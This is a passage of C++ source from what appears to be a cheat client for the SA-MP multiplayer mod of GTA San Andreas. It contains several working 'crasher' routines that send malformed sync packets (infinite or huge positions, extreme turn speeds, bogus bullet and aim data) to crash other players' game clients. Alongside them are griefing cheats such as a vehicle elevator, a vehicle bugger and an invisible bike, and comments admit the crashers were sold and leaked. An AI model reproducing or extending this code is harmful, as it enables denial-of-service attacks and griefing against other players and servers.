				vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
					OnFootData.fPosition);
				OnFootData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
				OnFootData.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
				BitStream bsOnFoot;
				bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsOnFoot.Write((PCHAR)&OnFootData, sizeof(stOnFootData));
				g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				
				//for uif protection
				BitStream bsEnterVehicle;
				bsEnterVehicle.Write(vehicleID);
				bsEnterVehicle.Write(0);
				g_RakFuncs->RPC(RPC_EnterVehicle, &bsEnterVehicle);
				
				dwInvisibleTick = GetTickCount();
				times++;
			}
		}
		else
		{
			wrong_way = true;
		}
	}
	else
	{
		wrong_way = true;
	}
	if (wrong_way)
	{
		char* error_message = "You must drive a motorcycle/bike";
		float Height = 50.0f;
		float Width = pD3DFont_Footer->DrawLength(error_message) + 40;
		//#define OL_COLOR1_2(a) D3DCOLOR_ARGB(a, 0, 60, 70)
		//#define OL_COLOR2(a) D3DCOLOR_ARGB(a, 0, 255, 255)
		render->D3D_OL_Double_Parallelogram(((pPresentParam.BackBufferWidth - Width) / 2) - 20,
			(pPresentParam.BackBufferHeight - Height) / 2,
			Width + pD3DFont_Footer->DrawHeight(),
			Height,
			D3DCOLOR_ARGB(128, 0, 60, 70), D3DCOLOR_ARGB(128, 0, 255, 255));
		pD3DFont_Footer->Print(error_message, D3DCOLOR_ARGB(0xFF, 0x00, 0x99, 0x99),
			((pPresentParam.BackBufferWidth - Width - pD3DFont_Footer->DrawHeight()) / 2),
			(pPresentParam.BackBufferHeight - Height + pD3DFont_Footer->DrawHeight()) / 2, false, false);
	}
}

void OL_VehicleElevator()
{
	OLCheats->bIsVehCheatActive = true;
	static bool state = false;
	float fPos[3], fSpeed[3];
	static DWORD UpdateVehicleIDTick = GetTickCount();
	if (IsPlayerStreamed(OLCheats->Target_PlayerID))
	{
		if (!IsVehicleStreamed(OLCheats->iVehicleID)
			|| (GetTickCount() - UpdateVehicleIDTick > 10000))
		{
			GetStreamedVehicle();
			if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
			{
				OLCheats->iVehicleID = 0;
				return;
			}
			UpdateVehicleIDTick = GetTickCount();
		}
		vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], fPos);
		fPos[0] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[0]
			* 10.97f;
		fPos[1] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[1]
			* 10.97f;
		fPos[2] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[2]
			* 10.97f;
		fSpeed[0] = g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->speed[0] * 1.5;
		fSpeed[1] = g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->speed[1] * 1.5;
		fSpeed[2] = 2.0f;
	
		if (OLCheats->bVehicleElevatorDown)
		{
			if (g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->onFootData.sSurfingVehicleID != OLCheats->iVehicleID)//(state)
			{
				fPos[2] += -1.5f;
				fSpeed[2] = -0.1f;
			}
			else
			{
				fPos[2] += -5.0f;
				fSpeed[2] = -2.0f;
			}
			state ^= true;
		}
		VehicleSync(fPos, fSpeed);
		VehicleLocalSync(fPos, fSpeed);
	}
}
void OL_VortexPlaneCrasher()
{
	OLCheats->bIsVehCheatActive = true;
	static DWORD dwCrasherTick = GetTickCount();
	bool wrong_way = false;
	if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
	{
		int vehicleID = g_Players->pLocalPlayer->inCarData.sVehicleID;
		vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
		if (!vinfo)
			return;
		int class_id = gta_vehicle_get_by_id(vinfo->base.model_alt_id)->class_id;
		if (class_id == VEHICLE_CLASS_AIRPLANE
			|| vinfo->base.model_alt_id == 539)
		{
			if (GetTickCount() - dwCrasherTick >= 1000)
			{
				stInCarData InCar;
				memcpy(&InCar, &g_Players->pLocalPlayer->inCarData, sizeof(stInCarData));
				float zero = 0;
				float infinito = 0;
				InCar.fPosition[2] = infinito;
				BitStream bsInCar;
				bsInCar.Write((BYTE)ID_VEHICLE_SYNC);
				bsInCar.Write((PCHAR)&InCar, sizeof(stInCarData));
				g_RakFuncs->Send(&bsInCar, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				dwCrasherTick = GetTickCount();
			}

		}
		else
		{
			wrong_way = true;
		}
	}
	else
	{
		wrong_way = true;
	}
	if (wrong_way)
	{
		char* error_message = "You must drive a Vortex or Plane";
		float Height = 50.0f;
		float Width = pD3DFont_Footer->DrawLength(error_message) + 40;
		render->D3D_OL_Double_Parallelogram(((pPresentParam.BackBufferWidth - Width) / 2) - 20,
			(pPresentParam.BackBufferHeight - Height) / 2,
			Width + pD3DFont_Footer->DrawHeight(),
			Height,
			D3DCOLOR_ARGB(128, 0, 60, 70), D3DCOLOR_ARGB(128, 0, 255, 255));
		pD3DFont_Footer->Print(error_message, D3DCOLOR_ARGB(0xFF, 0x00, 0x99, 0x99),
			((pPresentParam.BackBufferWidth - Width - pD3DFont_Footer->DrawHeight()) / 2),
			(pPresentParam.BackBufferHeight - Height + pD3DFont_Footer->DrawHeight()) / 2, false, false);
	}

}


void VehicleBugger() // for better work, use a shotgun
{
	traceLastFunc("VehicleBugger()");

	static bool bBuggerState = true;
	bBuggerState ^= true;

	if (OLCheats->bVehicleBugger)
	{

		float fVehiclePos[3];
		CVector vecVehiclepos;
		CVehicle *pVehicle;
		int iVehicleID = OLCheats->iVehicleID;
		
		if (bBuggerState)
		{
			if (!IsVehicleStreamed(iVehicleID))
				return;
			vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(OLCheats->iVehicleID);
			stUnoccupiedData UnoccupiedData;
			memset(&UnoccupiedData, 0, sizeof(stUnoccupiedData));
			UnoccupiedData.sVehicleID = iVehicleID;
			
			vehicle_info *vi = g_Vehicles->pSAMP_Vehicle[iVehicleID]->pGTA_Vehicle;

			if (vi == nullptr)
				return;

			pVehicle = pGameInterface->GetPools()->GetVehicle((DWORD*)vi);
			if (isBadPtr_GTA_pVehicle(pVehicle))
				return;
			vecVehiclepos = pVehicle->GetInterface()->Placeable.matrix->vPos;

			fVehiclePos[0] = vecVehiclepos.fX;
			fVehiclePos[1] = vecVehiclepos.fY;
			fVehiclePos[2] = vecVehiclepos.fZ;

			vect3_copy(fVehiclePos, UnoccupiedData.fPosition);

			UnoccupiedData.byteSeatID = 1;

			UnoccupiedData.fHealth = vinfo->hitpoints;//1000.0f;

			UnoccupiedData.fMoveSpeed[2] = 0.01f;

			BitStream bsUnoccupied;
			bsUnoccupied.Write((BYTE)ID_UNOCCUPIED_SYNC);
			bsUnoccupied.Write((PCHAR)&UnoccupiedData, sizeof(stUnoccupiedData));
			g_RakFuncs->Send(&bsUnoccupied, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);


			stBulletData BulletData;
			memset(&BulletData, 0, sizeof(stBulletData));
			BulletData.byteType = 2;
			BulletData.byteWeaponID = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

			BulletData.fCenter[0] = (float)((rand() % 100) / 100);
			BulletData.fCenter[1] = (float)((rand() % 100) / 100);
			BulletData.fCenter[2] = (float)((rand() % 100) / 100);

			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], BulletData.fOrigin);

			vect3_copy(fVehiclePos, BulletData.fTarget);

			BulletData.sTargetID = iVehicleID;

			BitStream bsBullet;
			bsBullet.Write((BYTE)ID_BULLET_SYNC);
			bsBullet.Write((PCHAR)&BulletData, sizeof(stBulletData));
			g_RakFuncs->Send(&bsBullet, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		}
		else
		{
			GetStreamedVehicle();
			if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
			{
				OLCheats->iVehicleID = 0;
				return;
			}

			stOnFootData OnFootSync;
			memcpy(&OnFootSync, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], OnFootSync.fPosition);
			OnFootSync.sSurfingVehicleID = OLCheats->iVehicleID;

			BitStream bsOnFoot;
			bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
			bsOnFoot.Write((PCHAR)&OnFootSync, sizeof(stOnFootData));
			g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		}

		
	}
}


void Crasher() // private crashers
{
	traceLastFunc("Crasher()");
	bool crasherState = false;
	static int iPlayerCrash = 0;
	if (OLCheats->bBulletCrasher)//Passenger + Unoccupied(big turn speed) + bullets
	{
		crasherState = true;
		if (!IsVehicleStreamed(OLCheats->iVehicleID))
		{
			GetStreamedVehicle();
			if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
			{
				OLCheats->iVehicleID = 0;
				return;
			}
		}
		stPassengerData PassengerData;
		memset(&PassengerData, 0, sizeof(stPassengerData));
		PassengerData.sVehicleID = OLCheats->iVehicleID;
		PassengerData.byteSeatID = 1;
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], PassengerData.fPosition);
		PassengerData.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
		PassengerData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
		PassengerData.byteCurrentWeapon = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;
		BitStream bsPassenger;
		bsPassenger.Write((BYTE)ID_PASSENGER_SYNC);
		bsPassenger.Write((PCHAR)&PassengerData, sizeof(stPassengerData));
		g_RakFuncs->Send(&bsPassenger, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		stUnoccupiedData UnoccupiedData;
		vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(OLCheats->iVehicleID);
		memset(&UnoccupiedData, 0, sizeof(stUnoccupiedData));
		UnoccupiedData.sVehicleID = OLCheats->iVehicleID;
		vect3_copy(
			&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
			UnoccupiedData.fPosition);
		UnoccupiedData.byteSeatID = 1;

		UnoccupiedData.fHealth = vinfo->hitpoints;//1000.0F;

		UnoccupiedData.fRoll[0] = 1;
		UnoccupiedData.fRoll[1] = 0;
		UnoccupiedData.fRoll[2] = 0;

		UnoccupiedData.fDirection[0] = 0;
		UnoccupiedData.fDirection[1] = 1;
		UnoccupiedData.fDirection[2] = 0;

		UnoccupiedData.fTurnSpeed[0] = 90000;
		UnoccupiedData.fTurnSpeed[1] = 90000;
		UnoccupiedData.fTurnSpeed[2] = 90000;
		BitStream bsUnoccupied;
		bsUnoccupied.Write((BYTE)ID_UNOCCUPIED_SYNC);
		bsUnoccupied.Write((PCHAR)&UnoccupiedData, sizeof(stUnoccupiedData));
		g_RakFuncs->Send(&bsUnoccupied, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		//get player id
		for (iPlayerCrash++; iPlayerCrash < SAMP_MAX_PLAYERS; iPlayerCrash++)
		{
			if(IsPlayerStreamed(iPlayerCrash))
				break;
		}
		cheat_state_text("id %d crashed", iPlayerCrash);

		if (iPlayerCrash >= SAMP_MAX_PLAYERS)
		{
			iPlayerCrash = -1;
			return;
		}
		stBulletData BulletData;
		memset(&BulletData, 0, sizeof(stBulletData));
		BulletData.byteType = 1;
		BulletData.byteWeaponID = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;
		BulletData.sTargetID = iPlayerCrash;
		BulletData.fCenter[0] = 0.0f;
		BulletData.fCenter[1] = 0.0f;
		BulletData.fCenter[2] = 0.56 - ((rand() % 5) / 100.0f);
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
			BulletData.fOrigin);
		vect3_copy(&g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12],
			BulletData.fTarget);
		BitStream bsBullet;
		bsBullet.Write((BYTE)ID_BULLET_SYNC);
		bsBullet.Write((PCHAR)&BulletData, sizeof(stBulletData));
		g_RakFuncs->Send(&bsBullet, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

	}
	if (OLCheats->bCarJackCrasher)//In Car and On Foot(jacking vehicle) + Aim(cam mode 49) +  bullet
	{
		static DWORD AimCrasherTick = GetTickCount();
		if (GetTickCount() - AimCrasherTick < 167)
		{
			//get player id
			for (iPlayerCrash++; iPlayerCrash < SAMP_MAX_PLAYERS; iPlayerCrash++)
			{
				if (g_Players != NULL
					&& iPlayerCrash != g_Players->sLocalPlayerID
					&& g_Players->pRemotePlayer[iPlayerCrash] != NULL
					&&	 g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData != NULL
					&& g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->bytePlayerState == PLAYER_STATE_DRIVER)
				{
					break;
				}
			}
			if (iPlayerCrash >= SAMP_MAX_PLAYERS)
				iPlayerCrash = -1;
			if (iPlayerCrash != -1)
			{
				cheat_state_text("a");
				stInCarData InCarData;
				memset(&InCarData, 0, sizeof(stInCarData));
				InCarData.fVehicleHealth = 1000;
				InCarData.sVehicleID = g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->inCarData.sVehicleID;//work
				vect3_copy(g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->inCarData.fPosition, InCarData.fPosition);
				InCarData.bytePlayerHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
				InCarData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
				BitStream bsInCar;
				bsInCar.Write((BYTE)ID_VEHICLE_SYNC);
				bsInCar.Write((PCHAR)&InCarData, sizeof(stInCarData));
				g_RakFuncs->Send(&bsInCar, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			}
		}
		else
		{
			cheat_state_text("b");
			BitStream bsOnFoot;
			bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
			bsOnFoot.Write((PCHAR)&g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
			g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			stAimData AimData;
			memset(&AimData, 0, sizeof(stAimData));
			AimData.byteCamMode = 49;
			AimData.vecAimf1[2] = -1;
			BitStream bsAim;
			bsAim.Write((BYTE)ID_AIM_SYNC);
			bsAim.Write((PCHAR)&AimData, sizeof(stAimData));
			g_RakFuncs->Send(&bsAim, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			stBulletData BulletData;
			memset(&BulletData, 0, sizeof(stBulletData));
			BulletData.byteType = 1;
			BulletData.byteWeaponID = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;
			BulletData.sTargetID = iPlayerCrash;
			BitStream bsBullet;
			bsBullet.Write((BYTE)ID_BULLET_SYNC);
			bsBullet.Write((PCHAR)&BulletData, sizeof(stBulletData));
			g_RakFuncs->Send(&bsBullet, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
			if (GetTickCount() - AimCrasherTick >= 333)
			{
				AimCrasherTick = GetTickCount();
			}
		}
	}

	// this crasher is old? I didn't know about it
	// yeah of course I copied it from another
	// but from who? o_O
	if (OLCheats->bDetonatorCrasher)
	{
		static DWORD DetonatorCrasherTick = GetTickCount();
		static int iCamModeCount = 0;
		int iCameModeID[7] = { 7, 8, 34, 45, 46, 51, 65 };
		static bool bState = false;

		if (GetTickCount() - DetonatorCrasherTick < 1000)
		{
			if (!bState)
			{
				stOnFootData OnFootData;
				memcpy(&OnFootData, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
				OnFootData.sKeys = 128; // works only with key for aim
				OnFootData.byteCurrentWeapon = 40;
				BitStream bsOnFoot;
				bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsOnFoot.Write((PCHAR)&OnFootData, sizeof(stOnFootData));
				g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				bState = true;
			}
		}
		else
		{
			if (bState)
			{
				stOnFootData OnFootData;
				memcpy(&OnFootData, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
				OnFootData.fPosition[0] += 200000.f;
				OnFootData.fPosition[1] += 200000.f;

				OnFootData.sKeys = 128;
				OnFootData.byteCurrentWeapon = 40;
				BitStream bsOnFoot;
				bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsOnFoot.Write((PCHAR)&OnFootData, sizeof(stOnFootData));
				g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				bState = false;
			}
			if (GetTickCount() - DetonatorCrasherTick > 2000)
			{
				DetonatorCrasherTick = GetTickCount();
			}
		}


		stAimData AimData;
		memcpy(&AimData, &g_Players->pLocalPlayer->aimData, sizeof(stAimData));
		AimData.byteCamMode = iCameModeID[iCamModeCount];
		BitStream bsAim;
		bsAim.Write((BYTE)ID_AIM_SYNC);
		bsAim.Write((PCHAR)&AimData, sizeof(stAimData));
		g_RakFuncs->Send(&bsAim, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		iCamModeCount++;
		if (iCamModeCount >= 7)
			iCamModeCount = 0;

	}
	static bool bGotVehicle = false;
	static DWORD StuntCrasherTick = GetTickCount();
	static bool bExited = false;
	// maybe works better with hunter
	if (OLCheats->bStuntCrasher || OLCheats->bHunterCrasher)
	{
		
		static int iVehicleCrash = 0;
		int iCurrentVehicle = g_Players->pLocalPlayer->inCarData.sVehicleID;
		static bool bSendExit = false;
		static bool bDoorGetRekt = false;
		//static bool bStuntCrasherState = false;
		iVehicleCrash = iCurrentVehicle;

		cheat_state_text("%d", iVehicleCrash);
		
		// this crasher works only with shamal and stunt
		// passenger + unoccupied (bad vector) + doors damage + delay + onfoot
		// very fast warning crasher c:
		// how i should make a anti crasher without getting warnings?
		// very big mistake release these crashers, but I haven't a Time Machine
		// very big mistake to release this my shit on another project..
		// and selling it as them, and I said these are very private.. RIP samp

		if (GetTickCount() - StuntCrasherTick < (DWORD)(bExited ? 1 : 1000))
		{	
			/*
			if (!bSendExit)
			{
				BitStream bsData4RPC;
				bsData4RPC.Write(iVehicleCrash);
				g_RakFuncs->RPC(RPC_ExitVehicle, &bsData4RPC);
				bSendExit = true;
			}
			*/
			
			stOnFootData OnFootSync;
			memcpy(&OnFootSync, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], OnFootSync.fPosition);

			BitStream bsOnFoot;
			bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
			bsOnFoot.Write((PCHAR)&OnFootSync, sizeof(stOnFootData));
			g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);


			stUnoccupiedData UnoccupiedData;
			vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(iVehicleCrash);

			if (!vinfo)
				return;

			memset(&UnoccupiedData, 0, sizeof(stUnoccupiedData));
			UnoccupiedData.sVehicleID = iVehicleCrash;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], UnoccupiedData.fPosition);
			UnoccupiedData.byteSeatID = 1;
			UnoccupiedData.fHealth = vinfo->hitpoints;//1000;
			UnoccupiedData.fMoveSpeed[2] = 1.0f;
			BitStream bsUnoccupied;
			bsUnoccupied.Write((BYTE)ID_UNOCCUPIED_SYNC);
			bsUnoccupied.Write((PCHAR)&UnoccupiedData, sizeof(stUnoccupiedData));
			g_RakFuncs->Send(&bsUnoccupied, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			/*
			BitStream bsDamageVehicle;
			bsDamageVehicle.Write(iVehicleCrash);
			bsDamageVehicle.Write((int)(bDoorGetRekt ? 0 : 4));//bumper
			bsDamageVehicle.Write((int)(bDoorGetRekt ? 0 : 4));//door
			bsDamageVehicle.Write((uint8_t)0);//lights
			bsDamageVehicle.Write((uint8_t)0);//tires
			g_RakFuncs->RPC(RPC_DamageVehicle, &bsDamageVehicle, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE);		
			*/
		}
		else
		{

			vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(iVehicleCrash);

			if (!vinfo)
				return;
			
			stPassengerData PassengerData;
			memset(&PassengerData, 0, sizeof(stPassengerData));
			PassengerData.sVehicleID = iVehicleCrash;
			PassengerData.byteSeatID = 1;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], PassengerData.fPosition);
			PassengerData.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
			PassengerData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
			BitStream bsPassenger;
			bsPassenger.Write((BYTE)ID_PASSENGER_SYNC);
			bsPassenger.Write((PCHAR)&PassengerData, sizeof(stPassengerData));
			g_RakFuncs->Send(&bsPassenger, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			stUnoccupiedData UnoccupiedData;
			memset(&UnoccupiedData, 0, sizeof(stUnoccupiedData));
			UnoccupiedData.sVehicleID = iVehicleCrash;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], UnoccupiedData.fPosition);
			UnoccupiedData.byteSeatID = 1;
			UnoccupiedData.fHealth = vinfo->hitpoints;
			UnoccupiedData.fMoveSpeed[2] = 1.0f;
			BitStream bsUnoccupied;
			bsUnoccupied.Write((BYTE)ID_UNOCCUPIED_SYNC);
			bsUnoccupied.Write((PCHAR)&UnoccupiedData, sizeof(stUnoccupiedData));
			g_RakFuncs->Send(&bsUnoccupied, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
/*
			BitStream bsDamageVehicle;
			bsDamageVehicle.Write(iVehicleCrash);
			bsDamageVehicle.Write((int)(bDoorGetRekt ? 0 : 4));//bumper
			bsDamageVehicle.Write((int)(bDoorGetRekt ? 0 : 4));//door
			bsDamageVehicle.Write((uint8_t)0);//lights
			bsDamageVehicle.Write((uint8_t)0);//tires
			g_RakFuncs->RPC(RPC_DamageVehicle, &bsDamageVehicle, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE);
*/
			if (GetTickCount() - StuntCrasherTick >= 2)
			{

				BitStream bsDamageVehicle;
				bsDamageVehicle.Write(iVehicleCrash);
				bsDamageVehicle.Write((int)(4));//bumper
				bsDamageVehicle.Write((int)(4));//door
				bsDamageVehicle.Write((uint8_t)0);//lights
				bsDamageVehicle.Write((uint8_t)0);//tires
				g_RakFuncs->RPC(RPC_DamageVehicle, &bsDamageVehicle, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE);
				StuntCrasherTick = GetTickCount();
			}
			bExited = true;
			bSendExit = false;
			bDoorGetRekt ^= true;
		}

		if (!crasherState)
			bGotVehicle = false;
	}
	else
	{
		StuntCrasherTick = GetTickCount();
		bExited = false;
	}
}


void OL_VortexPlaneCrasher2()
{
	OLCheats->bIsVehCheatActive = true;
	static DWORD dwCrasherTick = GetTickCount();
	static DWORD dwCrasherTick2 = GetTickCount();
	bool wrong_way = false;
	if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
	{
		int vehicleID = g_Players->pLocalPlayer->inCarData.sVehicleID;
		vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
		if (!vinfo)
			return;
		int crashtype = 0;
		int class_id = gta_vehicle_get_by_id(vinfo->base.model_alt_id)->class_id;
		if (class_id == VEHICLE_CLASS_AIRPLANE
			|| vinfo->base.model_alt_id == 539)
		{
			if (GetTickCount() - dwCrasherTick >= 2050)
			{
				static DWORD dwPassengerTick = GetTickCount();
				if(GetTickCount() - dwPassengerTick >= 80)
				{
					BitStream bsData4RPC;
					bsData4RPC.Write(vehicleID);
					bsData4RPC.Write(0);
					g_RakFuncs->RPC(RPC_EnterVehicle, &bsData4RPC);

					stPassengerData PassengerSync;
					memset(&PassengerSync, 0, sizeof(stPassengerData));
					PassengerSync.sVehicleID = vehicleID;
					PassengerSync.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
					PassengerSync.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
					vect3_copy(&vinfo->base.matrix[12], PassengerSync.fPosition);

					BitStream bsPassenger;
					bsPassenger.Write((BYTE)ID_PASSENGER_SYNC);
					bsPassenger.Write((PCHAR)&PassengerSync, sizeof(stPassengerData));
					g_RakFuncs->Send(&bsPassenger, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
					dwPassengerTick = GetTickCount();
				}

				if (GetTickCount() - dwCrasherTick >= 5000)
				{
					BitStream bsData4RPC;
					bsData4RPC.Write(vehicleID);
					g_RakFuncs->RPC(RPC_ExitVehicle, &bsData4RPC);
					dwCrasherTick = GetTickCount();
					crashtype++;
					if (crashtype == 3)
						crashtype = 0;
				}
			}
			else if (GetTickCount() - dwCrasherTick2 >= 50)
			{
				stOnFootData OnFootSync;
				memcpy(&OnFootSync, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));

				vect3_copy(&vinfo->base.matrix[12], OnFootSync.fPosition);
				OnFootSync.byteHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
				OnFootSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
				OnFootSync.byteCurrentWeapon = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

				BitStream bsOnFoot;
				bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsOnFoot.Write((PCHAR)&OnFootSync, sizeof(stOnFootData));
				g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				stUnoccupiedData UnoccupiedSync;
				memset(&UnoccupiedSync, 0, sizeof(stUnoccupiedData));
				UnoccupiedSync.sVehicleID = vehicleID;
				UnoccupiedSync.byteSeatID = 1;
				UnoccupiedSync.fHealth = vinfo->hitpoints;//1000.0f;
				UnoccupiedSync.fDirection[1] = 1.0f;
				UnoccupiedSync.fRoll[0] = 1.0f;
				vect3_copy(&vinfo->base.matrix[12], UnoccupiedSync.fPosition);
				
				switch (crashtype)
				{
					case 0:
					UnoccupiedSync.fPosition[2] = 1e11f;
					break;
					case 1:
						if (true)
						{
							float zero = 0;
							float infinito = 1 / zero;
							UnoccupiedSync.fPosition[2] = infinito;
						}
						break;
					case 2:
						UnoccupiedSync.fPosition[2] = FLT_MAX;
						break;
				}

				BitStream bsUnoccupied;
				bsUnoccupied.Write((BYTE)ID_UNOCCUPIED_SYNC);
				bsUnoccupied.Write((PCHAR)&UnoccupiedSync, sizeof(stUnoccupiedData));
				g_RakFuncs->Send(&bsUnoccupied, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				dwCrasherTick2 = GetTickCount();
			}

		}
		else
		{
			wrong_way = true;
		}
	}
	else
	{
		wrong_way = true;
	}
	if (wrong_way)
	{
		char* error_message = "You must drive a Vortex or Plane";
		float Height = 50.0f;
		float Width = pD3DFont_Footer->DrawLength(error_message) + 40;
		render->D3D_OL_Double_Parallelogram(((pPresentParam.BackBufferWidth - Width) / 2) - 20,
			(pPresentParam.BackBufferHeight - Height) / 2,
			Width + pD3DFont_Footer->DrawHeight(),
			Height,
			D3DCOLOR_ARGB(128, 0, 60, 70), D3DCOLOR_ARGB(128, 0, 255, 255));
		pD3DFont_Footer->Print(error_message, D3DCOLOR_ARGB(0xFF, 0x00, 0x99, 0x99),
			((pPresentParam.BackBufferWidth - Width - pD3DFont_Footer->DrawHeight()) / 2),
			(pPresentParam.BackBufferHeight - Height + pD3DFont_Footer->DrawHeight()) / 2, false, false);
	}

}


void OL_InvisibleBike()
{
	OLCheats->bIsVehCheatActive = true;
	static DWORD dwInvisibleTick = GetTickCount();
	static int times = 0;
	bool wrong_way = false;
	if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
	{
		int vehicleID = g_Players->pLocalPlayer->inCarData.sVehicleID;
		vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
		if (!vinfo)
			return;
		if (vinfo->vehicle_type == VEHICLE_TYPE_BIKE)
		{
			if (GetTickCount() - dwInvisibleTick >= 1000)
			{
				stInCarData InCar;
				memset(&InCar, 0, sizeof(stInCarData));
				InCar.sVehicleID = vehicleID;
				vect3_copy(g_Players->pLocalPlayer->inCarData.fPosition, InCar.fPosition);
				InCar.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
				InCar.byteCurrentWeapon = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;
				InCar.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
